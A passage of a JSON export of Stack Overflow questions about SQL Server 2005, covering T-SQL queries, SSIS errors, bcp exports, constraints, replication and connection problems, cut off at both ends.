1\n</code></pre>\n\n<p>Group table:</p>\n\n<pre><code>GroupID    Name\n---------------\n      1      G1\n      2      G2\n      3      X1\n</code></pre>\n\n<p>As You can see John has 3 orders, Kate 1, Will 1, Jack and Sam none.<br /></p>\n\n<p>Now I would like to assign operators to orders base on some conditions:</p>\n\n<ul>\n<li>order must have cash>0</li>\n<li>order must have status=1</li>\n<li>order must be in group 1 or 2</li>\n<li>operator must be active (active=1)</li>\n<li>operator must be in group 1 or 2</li>\n</ul>\n\n<p>This is the result that I would like to get:</p>\n\n<pre><code>OrderID    OperatorID    GroupID        OrderDesc    Status    Cash    ...\n--------------------------------------------------------------------------\n      1             1          1      small order         1     100       &lt; change\n      2             1          1    another order         2       0 \n      3             2          2      xxxxxxxxxxx         2    1000       &lt; change\n      5             4          2      yyyyyyyyyyy         2     150       &lt; change\n      9             5          1      xxxxxxxxxxx         1       0 \n     10             4          2      xxxxxxxxxxx         1      10       &lt; change\n     11          NULL          3      xxxxxxxxxxx         1     120 \n</code></pre>\n\n<p>I would like to shuffle orders and update operatorID so that every time I call this script I get randomly assigner operatorID, but every operator will have equal number or orders (close to equal, because if I have 7 orders one person will have 3 and rest 2).</p>\n\n<p>I can use <code>NTILE</code> to distribute orders into groups, but I need to assign operatorID to that group.</p>\n\n<p>I think that I need to do something like this:</p>\n\n<pre><code>SELECT NTILE(2) OVER( order by orderID desc) as newID,* \nFROM\n    orders(NOLOCK)\n</code></pre>\n\n<p>This will give me my orders table grouped into equal parts. What I need to know is length of operators table (to add it as parameter to NTILE), after that I could join my results with operators (using <code>row_number()</code>)</p>\n\n<p>Is there a better solution?</p>\n\n<p>My question again: <strong>How to equally divide result set into groups and update that record set using another table data?</strong></p>\n\n<p><strong>EDIT:</strong>\nThis is my code so far: <a href=\"http://sqlfiddle.com/#!3/39849/25\" rel=\"nofollow\">http://sqlfiddle.com/#!3/39849/25</a></p>\n\n<p><strong>EDIT 2</strong>\nI've updated my question and added more conditions.</p>\n\n<p>I would like to assign operators to orders based on some conditions:</p>\n\n<ul>\n<li>order must have cash>0</li>\n<li>order must have status=1</li>\n<li>order must be in group 1 or 2</li>\n<li>operator must be active (active=1)</li>\n<li>operator must be in group 1 or 2</li>\n</ul>\n\n<p>I'm building this query as stored procedure.<br />\nSo the first step will be to generate data with new assignments into temporary table and after final approval in second step to update main table based on that temp table.</p>\n\n<p>I have 2 more questions:</p>\n\n<ol>\n<li><p>Will it be better to first select all all orders  and all operators that meets the conditions to temporary table and then do the shuffling or to do it all in one big query?</p></li>\n<li><p>I would like to pass array or groups as a parameter to my procedure. Which option would be the best to pass array to stored procedure (SQL Server 2005).<br /><br />\nI know this was asked many times but I would like to know if it is better to create a separate function that will cut comma separated string into table (<a href=\"http://www.sommarskog.se/arrays-in-sql-2005.html\" rel=\"nofollow\">http://www.sommarskog.se/arrays-in-sql-2005.html</a>) or to put everything inside one big fat procedure? :)</p></li>\n</ol>\n\n<hr>\n\n<p><strong>FINAL ANSWER:</strong> avilable at <a href=\"http://sqlfiddle.com/#!3/afb48/2\" rel=\"nofollow\">http://sqlfiddle.com/#!3/afb48/2</a></p>\n\n<pre><code>SELECT o.*, op.operatorName AS NewOperator, op.operatorID AS NewOperatorId\nFROM (SELECT o.*, (ROW_NUMBER() over (ORDER BY newid()) % numoperators) + 1 AS randseqnum\n      FROM Orders o CROSS JOIN\n     (SELECT COUNT(*) AS numoperators FROM operators WHERE operators.active=1) op\n      WHERE o.cash&gt;0 and o.status in (1,3)\n     ) o JOIN\n     (SELECT op.*, ROW_NUMBER() over (ORDER BY newid()) AS seqnum\n      FROM Operators op WHERE op.active=1\n     ) op\n     ON o.randseqnum = op.seqnum ORDER BY o.orderID\n</code></pre>\n\n<p>Answer based on Gordon's Linoff answer. Thanks!</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12154817,"title":"Scheduled job failure","body":"<p>I have a schedule job to take backup for every 8 hours in SQL Server 2008. Till day before yesterday everything was working fine but all of sudden the job got failed with the error message below.</p>\n\n<p>Executed as user: NT AUTHORITY\\SYSTEM. A nonrecoverable I/O error occurred on file \"FilePath\\FileName.BAK:\" 112(failed to retrieve text for this error. Reason: 15105). [SQLSTATE 42000] (Error 3271)  BACKUP DATABASE is terminating abnormally. [SQLSTATE 42000] (Error 3013).  The step failed.</p>\n\n<p>I tried searching in google bout didn't get the exact idea. Consider me a newbee in SQL Server 2008</p>\n\n<p>Any suggestions will be higly appriciated.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","memory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12148917,"title":"Sql Server 2005 Memory allocations","body":"<p>How do I find out the max and min memory allocated for SQL Server 2005? My sql server appears to have maxed out its memory on my box and does not seem to be doing any garbage collection.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","join"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12145305,"title":"Is there documentation on/can someone explain a nested join in TSQL?","body":"<p>I'm not quite sure how to describe this, and I'm not quite sure if it's just syntactical sugar. This is the first time I've seen it, and I'm having trouble finding a reference or explanation as to the why and what of it.</p>\n\n<p>I have a query as follows:</p>\n\n<pre><code>select * from\n     table1\n          join table2 on field1 = field2\n          join (\n               table3 \n                    join table4 on field3 = field4\n                    join table5 on field5 = field6\n               ) on field3 = field2 \n               -- notice the fields in the parens and outside the parens \n               -- are part of the on clause\n</code></pre>\n\n<p>Are the parentheses necessary? Will removing them change the join order? I'm in a SQL Server 2005 environment in this case. Thanks!</p>\n"},{"tags":["sql-server","sql-server-2008","entity-framework","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12146916,"title":"collation as function argument","body":"<p>I have a database that is supposed to store data in any language, there is going to be a column that tells me which locale it is, so i can't rely on database collation and will have to specify collation at runtime in queries.</p>\n\n<p>I also have the problem that i want to use <code>EF</code> for dataaccess, as we know using EF one cannot specify collation at runtime. I am thinking about creating a sql function that takes collation as argument and apply that function in all of the <code>Linq</code> Queries.</p>\n\n<p>but this fails </p>\n\n<pre><code>CREATE FUNCTION fn_Compare\n(   \n    @TextValue nvarchar(max),\n    @Culture varchar(10)\n)\nRETURNS  nvarchar(max)\nAS\nBEGIN\n    RETURN @TextValue COLLATE @Culture\nEND\nGO\n</code></pre>\n\n<p>does anyone know if this can be done ? </p>\n"},{"tags":["sql-server","performance","sql-server-2005","memory"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12147511,"title":"SQL Server 2005 performance issues","body":"<p>My logs look like this:</p>\n\n<pre><code>2012-08-24 16:43:32.00 spid56      Task (Worker 0x0000000407CF61C0) was forced to yield 6 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 4, 0\n2012-08-24 16:46:49.01 spid56      Task (Worker 0x000000042F46C1C0) was forced to yield 11 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 5, 0\n2012-08-24 16:53:12.16 spid55      Task (Worker 0x000000034974A1C0) was forced to yield 27 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 7, 0\n2012-08-24 16:58:54.44 spid57      Task (Worker 0x000000009504A1C0) was forced to yield 20 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 7, 0\n2012-08-24 16:59:26.90 spid55      Task (Worker 0x00000004144421C0) was forced to yield 28 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 8, 0\n2012-08-24 17:16:51.94 spid57      Task (Worker 0x0000000405B661C0) was forced to yield 97 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 8, 0\n</code></pre>\n\n<p>The SpCreatePowerStatCorr is a stored procedure that calls one of my SQL assemblies. I also noticed that our SQL server memory gets maxed out and never disposes of it's memory.</p>\n\n<p>Is there any way to improve Memory Management?  What does the worker yielding mean (will it cause the stored procedure to hang)?</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1160,"score":0,"question_id":3772514,"title":"SSIS Execute a Stored Procedure with the parameters from .CSV file SQL Server 2005","body":"<p>I'm learning SSIS and this seems like an easy task but I'm stuck. </p>\n\n<p>I have a CSV file Orders.csv with this data:</p>\n\n<pre><code>ProductId,Quantity,CustomerId\n1,1,104\n2,1,105\n3,2,106\n</code></pre>\n\n<p>I also have a stored procedure ssis_createorder that takes as input parameters:\n@productid int\n@quantity int\n@customerid int</p>\n\n<p>What I want to do is create an SSIS package that takes the .csv file as input and calls ssis_createorder three times for each row in the .csv file (the first row contains column names). </p>\n\n<p>Here is what I have done so far. </p>\n\n<p>I have created an SSIS package (Visual Studio 2005 &amp; SQL Server 2005). </p>\n\n<p>In Control Flow I have a Data Flow Task. </p>\n\n<p>The Data Flow has a Flat File source of my .csv file. All of of the columns are mapped. </p>\n\n<p>I have created a variable named orders of type Object. I also have variables CustomerId, ProductId, &amp; Quantity of type int32. </p>\n\n<p>Next I have a Recordset Destination that is assigning the contents of the .csv file into the varialbe orders. I'm not sure about how to use this tool. I'm setting the VariableName (under Customer Properties) to User::orders. I think that now orders holds an ADO record set made up of the contents from the original .csv file. </p>\n\n<p>Next I'm adding a ForEach Loop Container on the Control Flow tag and linking it to the Data Flow Task. </p>\n\n<p>Inside of the ForEach Loop Container I'm setting the Enumerator to \"ForEach ADO Enumerator\". I'm setting \"ADO object source variable\" to User::orders\". For Enumeration mode I'm selecting \"Rows in the first table\". </p>\n\n<p>In the Variable Mapping tab I have User::ProductId index 0, User::Quantity index 1, User::CustomerId index 2.  I'm not sure if this is correct. </p>\n\n<p>Next I have a Script Task inside of the ForEach Loop Container. </p>\n\n<p>I have ReadOnlyVariables set to ProductId. </p>\n\n<p>In the Main method this is what I'm doing:</p>\n\n<pre><code> Dim sProductId As String = Dts.Variables(\"ProductId\").Value.ToString\n\n MsgBox(\"sProductId\")\n</code></pre>\n\n<p>When I run the package my ForEach Loop Container turns Bright Red and I get the following error messages</p>\n\n<pre><code>Error: 0xC001F009 at MasterTest: The type of the value being assigned to variable \"User::ProductId\" differs from the current variable type. Variables may not change type during execution. Variable types are strict, except for variables of type Object.\nError: 0xC001C012 at Foreach Loop Container: ForEach Variable Mapping number 1 to variable \"User::ProductId\" cannot be applied.\nError: 0xC001F009 at MasterTest: The type of the value being assigned to variable \"User::Quantity\" differs from the current variable type. Variables may not change type during execution. Variable types are strict, except for variables of type Object.\nError: 0xC001C012 at Foreach Loop Container: ForEach Variable Mapping number 2 to variable \"User::Quantity\" cannot be applied.\nError: 0xC001F009 at MasterTest: The type of the value being assigned to variable \"User::CustomerId\" differs from the current variable type. Variables may not change type during execution. Variable types are strict, except for variables of type Object.\nError: 0xC001C012 at Foreach Loop Container: ForEach Variable Mapping number 3 to variable \"User::CustomerId\" cannot be applied.\nWarning: 0x80019002 at MasterTest: SSIS Warning Code DTS_W_MAXIMUMERRORCOUNTREACHED.  The Execution method succeeded, but the number of errors raised (12) reached the maximum allowed (1); resulting in failure. This occurs when the number of errors reaches the number specified in MaximumErrorCount. Change the MaximumErrorCount or fix the errors.\nSSIS package \"Package.dtsx\" finished: Failure.\n     Dts.TaskResult = Dts.Results.Success\n</code></pre>\n\n<p>Any help would be appreciated</p>\n"},{"tags":["sql","sql-server-2005","join","coalesce"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12100415,"title":"Complex join with coalesce","body":"<p>I have a table that I am stuffing demographic info into and then using dynamic sql to build a table from that. The demographic info comes from surveys and some of the surveys have checkboxes. With checkboxes people can select multiple values.</p>\n\n<p>So I need to enter all the choices as a comma seperated list. </p>\n\n<pre><code>CREATE TABLE Demographics \n  (\n    QID NVARCHAR(15)\n    ,userid NVARCHAR(50)\n    ,question NVARCHAR(800)\n    ,choice NVARCHAR(1000)\n  )\n...\n...\n--Demographics(QID,userid,question,choice)\n--'Insert checkbox (type 5)\nINSERT INTO Demographics\nSELECT CAST(q.QID AS NVARCHAR(15))\n    ,ri.userid\n    ,q.QuestionText\n    ,ac.Choice\nFROM ResponseInfo ri --response details\nJOIN Responses r ON ri.ResponseID = r.ResponseID --actual response\nJOIN Questions q ON r.QID = q.QID --question info\nJOIN AnswerChoices ac ON r.QID = ac.QID --answer choice text\nWHERE (q.QuestionTypeID = 5 AND q.QID = ac.QID\nAND r.IsOther = 0 \nAND q.QID = 16\n)\nAND ri.userid IN (SELECT userid FROM @Users) AND r.Response = ac.Sequence\nORDER BY ri.userid\n...\ndynamic sql stuff\n...\nEXEC sp_exesql @sql\n</code></pre>\n\n<p>My results look like this:</p>\n\n<pre><code>users | question_15 | choice_15 | question_16     | choice_16 |\nbill  | age?        | 37        | favorite color? | red       |\nbill  | age?        | 37        | favorite color? | green     |\n</code></pre>\n\n<p>But it needs to be:</p>\n\n<pre><code>users | question_15 | choice_15 | question_16     | choice_16 |\nbill  | age?        | 37        | favorite color? | red,green |    \n</code></pre>\n\n<p>I tried doing </p>\n\n<pre><code>,COALESCE(ac.Choice + ',','') + ac.Choice\n</code></pre>\n\n<p>It gave me</p>\n\n<pre><code>bill  | age?        | 37        | favorite color? | red,red   |\n</code></pre>\n\n<p>Can anyone help me sort this out?</p>\n"},{"tags":["sql-server-2005","insert-update","multiple-columns"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":12144516,"title":"Updating tables without naming all columns","body":"<p>I have found a way to make two tables from different databases match each other using this template:</p>\n\n<pre><code>INSERT [DestDB].[dbo].[TABLE]\nSELECT source.* FROM \n[SourceDB].[dbo].[TABLE] AS source\nLEFT OUTER JOIN\n[DestDB].[dbo].[TABLE] AS dest\nON \nsource.[PKColumn] = dest.[PKColumn]\nWHERE dest.[PKcolumn] IS NULL\n\nUPDATE dest\nSET \n dest.[PK_COLUMN1] = source.[PK_COLUMN1]\n,dest.[COLUMN2] = source.[COLUMN2]\n,dest.[COLUMN3] = source.[COLUMN3]\n,dest.[COLUMN4] = source.[COLUMN4]\n,dest.[COLUMN5] = source.[COLUMN5]\n,dest.[COLUMN6] = source.[COLUMN6]\n,dest.[COLUMN7] = source.[COLUMN7]\n,dest.[COLUMN8] = source.[COLUMN8]\n\nFROM \n[SourceDB].[dbo].[TABLE] AS source\nINNER JOIN \n[DestDB].[dbo].[TABLE] AS dest\nON source.[PK_Column1] = dest.[PK_Column1]\n</code></pre>\n\n<p>However some tables I am working with have at least 200 columns and while it is possible to do this through the power of Copy + Paste, I just need to know if there is a way that doesn't involve me getting Carpel Tunnel Syndrome.</p>\n\n<p>I am using Microsoft SQL Server 2005.</p>\n\n<p>Any advice?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":242,"score":-1,"question_id":2027138,"title":"Analyze the results of the sql query : dbcc showcontig","body":"<p>How can I analyze the results of the sql query : <code>dbcc showcontig</code> to improve the performance of sql?</p>\n"},{"tags":["sql","sql-server","debugging","sql-server-2005","bcp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":290,"score":1,"question_id":12140947,"title":"Using bcp utility to export SQL queries to a text file","body":"<p>I debug a stored procedure (SQL Server 2005) and I need to find out some values in a datatable.</p>\n\n<p>The procedure is run by an event of the application and I watch just the debugging output.</p>\n\n<p>I do the following my stored procedure (SQL Server 2005), I took a system table (master.dbo.spt_values) as example:</p>\n\n<pre><code>set @logtext = 'select name, type from master.dbo.spt_values where number=6'\n--set @logtext = 'master.dbo.spt_values'\nSET @cmd = 'bcp ' + @logtext + ' out \"c:\\spt_values.dat\" -U uId -P uPass -c'\nEXEC master..XP_CMDSHELL @cmd \n</code></pre>\n\n<p>So, when I uncomment the second like everything works, a file apprears on the C:\\ drive... but if I coment it back leaving only the first line, any output is generated. </p>\n\n<p>How to fix this problem?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12138979,"title":"Query SQL Server resources per user/application","body":"<p>I understand there is no easy way to query resource usage (cpu time, disk reads/writes) per database, but is there a way to query that information per specific connection string or user?</p>\n\n<p>I'm building an ASP.Net MVC3 application that uses Entity Framework to connect to a SQL Server database; I'm using the standard edition. I would like to know what my application costs on the database server.</p>\n"},{"tags":["java","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":91,"score":3,"question_id":12139012,"title":"Difference between SQL Date&Time and java Date&Time and which should be used?","body":"<p>I need to update a record with date and time, but I am confused to use either CURRENT_TIMESTAMP of sql server 2005 or date object of JAVA, both gives me the same result.</p>\n\n<p>example:</p>\n\n<pre><code>select CURRENT_TIMESTAMP\n</code></pre>\n\n<p>this will print <code>2012-08-27 14:30:17.193</code></p>\n\n<p>and this java code below will also do the same visibly but what is the difference.</p>\n\n<pre><code>           Date dNow = new Date( );\n           SimpleDateFormat ft = \n           new SimpleDateFormat (\"yyyy-MM-dd HH:mm:ss.SSS \");\n\n           System.out.println(\"Current Date: \" + ft.format(dNow));\n</code></pre>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I have 2 prepareStatement below for while I have used CURRENT_TIMESTAMP and for the 2nd one I have used date object of JAVA (the date object let it be either util.Date or sql.Date).</p>\n\n<p><strong>statement1</strong></p>\n\n<pre><code>  pst = con.prepareStatement(\"insert into sLog(logUser, logType, logSystem, logTime)\n             values(?, ?, ?, CURRENT_TIMESTAMP)\");\n                    pst.setString(1, logUser);\n                    pst.setString(2, logType);\n                    pst.setString(3, logSystem);\n                    pst.executeUpdate();\n</code></pre>\n\n<p><strong>statement2</strong></p>\n\n<pre><code>pst = con.prepareStatement(\"insert into sLog(logUser, logType, logSystem, logTime)\n             values(?, ?, ?, ?)\");\n                pst.setString(1, logUser);\n                pst.setString(2, logType);\n                pst.setString(3, logSystem);\n                pst.setString(4, format(dNow));\n                pst.executeUpdate();\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","query"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":12359,"score":4,"question_id":2965837,"title":"INSERT statement conflicted with the FOREIGN KEY constraint","body":"<p>I am getting the following error. Could you please help me in ?</p>\n\n<pre><code>Msg 547, Level 16, State 0, Line 1\nThe INSERT statement conflicted with the FOREIGN KEY constraint \"FK_Sup_Item_Sup_Item_Cat\". The conflict occurred in database \"dev_bo\", table \"dbo.Sup_Item_Cat\".\nThe statement has been terminated.\n\n\ninsert into sup_item (supplier_id,sup_item_id,name,sup_item_cat_id,status_code,last_modified_user_id,last_modified_timestamp,client_id) values(10162425,10,'jaiso','123123','a','12','2010-12-12','1062425')\n</code></pre>\n\n<p>the last coulum \"client_id\" i am getting the conflict. I tried to put the value which already exists in the dbo.Sup_Item_Cat to the column</p>\n\n<p>corresponding to the sup_item.. but no joy :-(</p>\n"},{"tags":["sql-server-2005","ssms","sql-server-2005-express"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":304,"score":1,"question_id":3855332,"title":"Same name tables under different schemas with SQL Server 2005 Management Studio Express","body":"<p>I know how to create a new schema and write a DDL script to create tables with the same name that reside in different schemas in the same database. I want to know how to do that using SQL Server 2005 Management Studio Express.</p>\n\n<p>To repeat, I want to know if I can create two tables having the same name but residing in different schemas of the same database using SQL Server 2005 Management Studio Express.</p>\n"},{"tags":["database","sql-server-2005","synchronization","syncframework","service-broker"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1752,"score":1,"question_id":2152385,"title":"Replication vs Sync Framework vs Service Broker","body":"<p>I've asked about each of these technologies separately, and really haven't found a suitable answer.</p>\n\n<p>We have a server in our central office running SQL Server 2005 Enterprise that has several large (large in the sense that DSL is the limiting factor) databases that we need local copies of at each of our locations.  We currently have a few dozen locations, and are needing to bring even more online.  The total number of locations we'll need to sync these databases to will be in the several hundreds in the next 2 years.</p>\n\n<p>We are trying to overcome issues with the WAN connection at each location.  These are DSL lines and the wiring at the locations isn't always the best.  We currently have issues with some of the locations going down as often as every hour.  While we are working to resolve these issues with rewiring and assistance from the local telcos, it mainly highlights the problem at hand: we need a two-way sync that can handle being occasionally-connected.</p>\n\n<p>We tried transactional replication for a while, and while it worked some of the time, it was too high maintenance for us, and it seemed to randomly error out often with no possible explanations, forcing us to reinitialize subscriptions (which could take upwards of 4 hours assuming the location would stay connected long enough to get the entire snapshot in one go).  We've looked at rolling our own solution from scratch, but I don't feel this would be the best idea given the scale and reliability we are needing.</p>\n\n<p>So far we've also looked at Sync Framework, and as suggested by someone else, Service Broker.  Sync Framework seems a better fit, but I was told that Service Broker scales better and is more reliable?  I can't find any empirical data on the overhead involved with Sync Framework or Service Broker, so it's proving impossible to compare the two in this regard.</p>\n\n<p>What we really need is a two-way sync between the central office server and a remote client that can run autonomously and can report to an admin in the event of a failure that requires our intervention.</p>\n\n<p>There are so many possible solutions to this problem, all involving completely different technologies, that I need a fresh eye on this.</p>\n\n<p>What do you think would be the optimal solution for our situation, and why?</p>\n\n<p>EDIT: Obviously, upgrading to SQL Server 2008 would solve this problem easily.  However, we would like to try to less expensive options first.</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12136088,"title":"T-SQL Average of Table Subset","body":"<p>I have a table (in SQL Server 2005) of daily weather data for a single location which includes these columns:</p>\n\n<pre><code>LogDate                 DATETIME  \nHighTemp                INT  \nTemp6MonthHighAverage   INT  \n</code></pre>\n\n<p><code>LogDate</code> and <code>HighTemp</code> have data. <code>HighTemp6MonthAverage</code> will be populated with, as the name suggests, the average high temperature for the 6 months ending in <code>LogDate</code>.</p>\n\n<p>There are similar requirements for LowTemp, as well as humidity and several other items, for data spanning decades.</p>\n\n<p>I find myself thinking in circles.  Can I derive this average for each row in an UPDATE statement using set operations, or do I need to implement a solution with cursors? I will appreciate any suggestions.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12134940,"title":"Need help on indexing using SQL server 2005","body":"<p>I have a table, <code>paymentdetails</code>, with a column <code>paymentstatus</code> (has a check constraint restricting values to either paid or pending). Also, a table <code>patientdetails</code>, that holds patientid, address......columns</p>\n\n<p>I want to create an index that speeds up the execution of extracting the patient details for each patient whose initial payment is pending.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12126384,"title":"sql server 2005 constraints and validations","body":"<p>I have a table that stores payment details with columns: (<code>paymentmethod</code>- which is in either check, cash or creditcard), (<code>Checknumber</code>), (<code>Cardholdersname</code>), (<code>creditcardnumber</code>). </p>\n\n<p>Question is: how do I validate that when <code>paymentmethod</code> is <code>cash</code> or check then <code>Cardholdersname</code>, <code>creditcardnumber</code> should be left blank and when <code>paymentmethod</code> is <code>creditcard</code> then <code>Checknumber</code> should be left blank.</p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12131631,"title":"Validation before bulkinsert in sql server","body":"<p>I want to import data from text file.which contain arround lakhs of records</p>\n\n<p>I am using bulk insert do it like this</p>\n\n<pre><code>BULK\nINSERT vw_bulk_insert_test\nFROM '\\\\server\\c$\\csvtext.txt'--\\\\server\\SQLEXPRESS\\csvtest.txt'\nWITH\n(FIRSTROW=2,\ncheck_CONSTRAINTS,\nFIELDTERMINATOR = '~',\nROWTERMINATOR = '\\n'\n)\nGO\n</code></pre>\n\n<p>But before insert I want to validate values of each column without using cursor.Like if second row will have values of all fields except unit_number(Column) then it should create a error log specifying unit_number value is missing.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12123737,"title":"How can I modify the size of a varchar?","body":"<p>I need to know if there is any way i can modify the size of a varchar from <code>varchar(40)</code> to <code>varchar(60)</code> and also add this constraint:</p>\n\n<pre><code>(( CASE WHEN DATEDIFF(day,Date_Election_President,CURRENT_TIMESTAMP) &gt;= 730 THEN\n             'NON'\n        ELSE 'OUI'\n   END ))\n</code></pre>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":12129955,"title":"Insert, Delete, Update table without using grid control in asp.net","body":"<p>How to insert, delete, update etc without using data grid server control in asp.net </p>\n"},{"tags":["c#","sql-server-2005","winapp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12129285,"title":"Connect to database from local network","body":"<p>I share two computer with local network</p>\n\n<ul>\n<li>computer1 : Windows XP, ip = 192.168.0.1</li>\n<li>computer2 : Windows 7 , ip = 192.168.0.2</li>\n</ul>\n\n<p>Now I want to connect to a SQL Server 2005 database that exists on <code>computer1</code> from <code>copmuter 2</code>  with a win app</p>\n\n<p>I use below connection string and check <code>Surface Area Configuration for Services and Connections</code> but I get an error:</p>\n\n<blockquote>\n  <p><em>A network-related or instance-specific error occurred while\n  establishing a connection to SQL Server. The server was not found or\n  was not accessible.Verify that the instance name is correct and that\n  SQL Server is configured to allow remote connections.SQL Network\n  Interfaces, error: 26 - Error Locating Server/Instance Specified</em></p>\n</blockquote>\n\n<p>Connection string:</p>\n\n<pre><code>Data Source=192.168.0.1;Initial Catalog=DBName;Integrated Security=True\n</code></pre>\n\n<p>and</p>\n\n<pre><code>Data Source=192.168.0.1;Initial Catalog=DBName;Integrated Security=false\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures","view"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12129057,"title":"Can't use ORDER BY when SELECTing from a view in a stored procedure","body":"<p>I have a view and while I can execute this statement without any error:</p>\n\n<pre><code>SELECT * from vwShippingNoticeBase\norder by InvoiceNum\n</code></pre>\n\n<p>when I try to make a stored procedure out of this exact same statement, I get an error:</p>\n\n<pre><code>create PROCEDURE [dbo].[upSELECT_shippingNoticeOrderByInvoiceNum]\nAS\nBEGIN\nSET NOCOUNT ON;\nSELECT * FROM vwShippingNoticeBase\norder by invoiceNum\n</code></pre>\n\n<p>Error:</p>\n\n<blockquote>\n  <p>Msg 102, Level 15, State 1, Procedure upSELECT_shippingNoticeByDateRange, Line 7<br>\n  Incorrect syntax near 'invoiceNum'.</p>\n</blockquote>\n\n<p>Very strange!</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12088032,"title":"View Missing Numbers in a Sequence by date","body":"<p>I have a table name \"Numerator\" has 3 columns: No_Fact, Numerat and Date. Like this:</p>\n\n<pre><code>No_Fact         Numerat         Date\n1207020015      000713          2012-07-02 00:00:00.000\n1207020016      000720          2012-07-02 00:00:00.000\n1207020017      000722          2012-07-02 00:00:00.000\n1207020019      000723          2012-07-02 00:00:00.000\n1207020022      000724          2012-07-02 00:00:00.000\n1207020021      000733          2012-07-02 00:00:00.000\n1207020020      000734          2012-07-02 00:00:00.000\n1207020018      000735          2012-07-02 00:00:00.000\n1208120001      000766          2012-08-12 00:00:00.000\n1208120002      000769          2012-08-12 00:00:00.000\n1208230001      000777          2012-08-23 00:00:00.000\n1208230002      000780          2012-08-23 00:00:00.000\n</code></pre>\n\n<p>I want to view some missing numbers between numbers inside Numerat column, so I have tried using the code that is:</p>\n\n<pre><code>SELECT A.Numerat+1 AS 'MISSING FROM', MIN(B.Numerat)-1 AS 'TO'\nFROM Numerator A, Numerator B\nWHERE A.Numerat &lt; B.Numerat\nGROUP BY A.Numerat\nHAVING A.Numerat+1 &lt; MIN(B.Numerat)\nORDER BY 1\n</code></pre>\n\n<p>And result set:</p>\n\n<pre><code>MISSING FROM   TO\n714            719 \n721            721\n725            732\n736            765\n767            768\n770            776\n778            779\n</code></pre>\n\n<p>This is a code that nice.\nBut the sequence numbers is too many, to be incompatible with the need to be concise. So I only want to show part rows today (2012-08-23) only, likes this:</p>\n\n<pre><code>MISSING FROM   TO\n778            779\n</code></pre>\n\n<p>I am very grateful to anyone who can decode it, Thank You.</p>\n\n<p>There's an interesting thing when the next line in the insert in the table,\nI show began on August 23 2012:</p>\n\n<pre><code>No_Fact         Numerat         Date\n1208230001      000777          2012-08-23 00:00:00.000\n1208230002      000780          2012-08-23 00:00:00.000\n1208250001      000782          2012-08-25 00:00:00.000\n1208250002      000783          2012-08-25 00:00:00.000\n1208250003      000784          2012-08-25 00:00:00.000\n1208250004      000785          2012-08-25 00:00:00.000\n1208250005      000786          2012-08-25 00:00:00.000\n1208250006      000788          2012-08-25 00:00:00.000\n1208250007      000789          2012-08-25 00:00:00.000\n1208250008      000790          2012-08-25 00:00:00.000\n1208250009      000793          2012-08-25 00:00:00.000\n1208250010      000794          2012-08-25 00:00:00.000\n</code></pre>\n\n<p>As my original purpose, that I want to see the missing numbers in the Numerat column and to summarily I only just wanted to show a line I enter this day alone, then with advice from bluefeet I use the following 